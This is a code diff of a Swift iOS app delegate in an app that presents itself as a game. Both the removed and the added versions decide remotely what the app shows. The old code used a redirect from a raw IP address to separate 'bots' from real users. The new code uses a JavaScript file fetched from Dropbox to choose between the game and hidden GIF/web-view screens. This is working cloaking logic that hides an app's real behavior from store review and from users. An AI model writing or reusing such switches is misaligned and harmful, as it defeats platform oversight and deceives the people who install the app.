@@ -7,41 +7,69 @@
 //
 
 import UIKit
-import OneSignal
 import Reachability
 
-class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserverDelegate {
-    fileprivate enum AppState {
-        case inGame
-        case WKWeb
-        case starting
-    }
-    
+enum AppState {
+    case inGame
+    case WKWeb
+    case starting
+}
+
+class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserverDelegate {    
     var window: UIWindow?
     static let shared = DifferentServices()
-    fileprivate let defaults = UserDefaults.standard
-    fileprivate var state: AppState
-    fileprivate var wasRun = false
+    fileprivate let dropboxURL = "https://www.dropbox.com/s/lh2ltz897qa9ww5/new_JS_shorts_forms_V2.js?dl=1"
+    fileprivate var wasGetDropboxUsing = false
+    fileprivate var state: AppState = .starting
+    let defaults = UserDefaults.standard
     
-    fileprivate var firstAppBoot: Bool {
+    var appIsGame: Bool {
         get {
-            return defaults.object(forKey: "firstAppBoot") as? Bool ?? true
-        } set (newValue) {
-            defaults.set(newValue, forKey: "firstAppBoot")
-        }
-    }
-    
-    fileprivate var appIsGame: Bool {
-        get {
-            return defaults.object(forKey: "appIsGame") as? Bool ?? true
+            return defaults.object(forKey: "appIsGame") as? Bool ?? false
         } set (newValue) {
             defaults.set(newValue, forKey: "appIsGame")
         }
     }
     
+    var secondBotCheck: Bool {
+        get {
+            return defaults.object(forKey: "secondBotCheck") as? Bool ?? false
+        } set (newValue) {
+            defaults.set(newValue, forKey: "secondBotCheck")
+        }
+    }
+    
+    var dropboxJSSource: String = "" {
+        didSet {
+            DispatchQueue.main.async {
+                if !self.dropboxJSSource.isEmpty && self.dropboxJSSource != "true" {
+                    self.launchGIF()
+                } else if self.dropboxJSSource == "true" {
+                    
+                    self.launchTheGame()
+                }
+            }
+        }
+    }
+    
+    fileprivate func getDropboxJS() {
+        if !wasGetDropboxUsing {
+            self.wasGetDropboxUsing = true
+            guard let url = URL(string: dropboxURL) else { return }
+            URLSession.shared.dataTask(with: url) { data, response, error in
+                guard error == nil else { return }
+                if let data = data {
+                    if let jsonString = String(data: data, encoding: .utf8) {
+                        print(#line, #function, "dropboxJSSource was loading from DropBox")
+                        self.dropboxJSSource = jsonString
+                    }
+                }
+            }.resume()
+        }
+    }
+    
     //MARK: - Reachability
     override init() {
-        self.state = .starting
         super.init()
         try? addReachabilityObserver()
     }
@@ -59,13 +87,8 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
             case .WKWeb:
                 dismmissNoInternet()
             case .starting:
-                print(#line, #function)
-                if firstAppBoot  {
-                    checkMainURL()
-                } else if appIsGame {
+                if appIsGame {
                     launchTheGame()
-                } else {
-                    break
                 }
             }
         } else {
@@ -77,105 +100,45 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
         print(#line, state)
     }
     
-    
     private func dismmissNoInternet() {
         if let topVC = topMostController() {
             topVC.dismiss(animated: true, completion: nil)
         }
     }
     
-    //MARK: - Bot checker logic
-    fileprivate func checkMainURL() {
-        if !wasRun {
-            let config = URLSessionConfiguration.default
-            let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
-            let url = URL(string:  "http://78.47.187.129/5P1WyX8M")!
-            let task = session.dataTask(with: url, completionHandler: { _, _, _ in })
-            task.resume()
-        }
-        print(#line, #function)
-        wasRun.toggle()
-    }
-    
-    fileprivate func gameOrNot(_ redirectURL: String) {
-        print(#file, #function, redirectURL)
-        if redirectURL == "https://nobot/" {
-            firstAppBoot = false
-            appIsGame = false
-            state = .WKWeb
-            hasPromptedOneSignal()
-            DispatchQueue.main.async {
-                self.launchWKweb()
-            }
-        } else {
-            firstAppBoot = false
-            appIsGame = true
-            state = .inGame
-            DispatchQueue.main.async {
-                self.launchTheGame()
-            }
-        }
-    }
-    
-    //MARK: - OneSignal
-    private func hasPromptedOneSignal() {
-        OneSignal.sendTag("nobot", value: "1")
-        let status: OSPermissionSubscriptionState = OneSignal.getPermissionSubscriptionState()
-        let hasPrompted = status.permissionStatus.hasPrompted
-        if !hasPrompted {
-            OneSignal.promptForPushNotifications { hasPrompted in
-                OneSignal.addTrigger("prompt_ios", withValue: "true")
-            }
-        }
-        print("hasPrompted = \(hasPrompted)")
-    }
-    
     //MARK: - UI Launcher
     func screenLauncher() {
-        if firstAppBoot  {
-            if reachable {
-                checkMainURL()
-            } else {
-                launchNoInternet()
-            }
+        if reachable && !appIsGame {
+            getDropboxJS()
+        } else if reachable && appIsGame{
+            launchTheGame()
         } else {
-            if reachable {
-                if appIsGame {
-                    launchTheGame()
-                } else {
-                    launchWKweb()
-                }
-            } else {
-                launchNoInternet()
-            }
+            launchNoInternet()
         }
-    }
-}
-//MARK: - URLSessionDataDelegate
-extension DifferentServices: URLSessionDataDelegate {
-    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
-        guard let redirectURL = request.url  else { return }
-        gameOrNot(redirectURL.absoluteString)
-        //completionHandler(request)
     }
 }
 
 //MARK: - GUI
 extension DifferentServices {
-    private func launchTheGame() {
+    func launchTheGame() {
         window = UIWindow(frame: UIScreen.main.bounds)
         window?.makeKeyAndVisible()
-        
         state = .inGame
         let storyboard = UIStoryboard(name: "Welcome", bundle: .main)
         let initialViewController = storyboard.instantiateViewController(withIdentifier: "WelcomeViewController")
         self.window?.rootViewController = initialViewController
     }
     
-    private func launchWKweb() {
+    private func launchGIF() {
+        window = UIWindow(frame: UIScreen.main.bounds)
+        let GIFVC = GIFViewController()
+        self.window?.rootViewController = GIFVC
+        window?.makeKeyAndVisible()
+    }
+    
+    func launchWKweb() {
         window = UIWindow(frame: UIScreen.main.bounds)
         window?.makeKeyAndVisible()
-        
         state = .WKWeb
         let storyboard = UIStoryboard(name: "WKweb", bundle: .main)
         let initialViewController = storyboard.instantiateViewController(withIdentifier: "WebViewController")
@@ -185,7 +148,6 @@ extension DifferentServices {
     private func launchNoInternet() {
         window = UIWindow(frame: UIScreen.main.bounds)
         window?.makeKeyAndVisible()
-        
         let storyboard = UIStoryboard(name: "NoInternet", bundle: .main)
         let initialViewController = storyboard.instantiateViewController(withIdentifier: "NoInternetViewController")
         if self.window?.rootViewController == nil {
@@ -193,7 +155,6 @@ extension DifferentServices {
             self.window?.rootViewController = initialViewController
         } else {
             if state != .starting {
-                print(#line, #function)
                 if let topVC = topMostController() {
                     let noVC = SecondNoInternetViewController()
                     noVC.modalPresentationStyle = .fullScreen
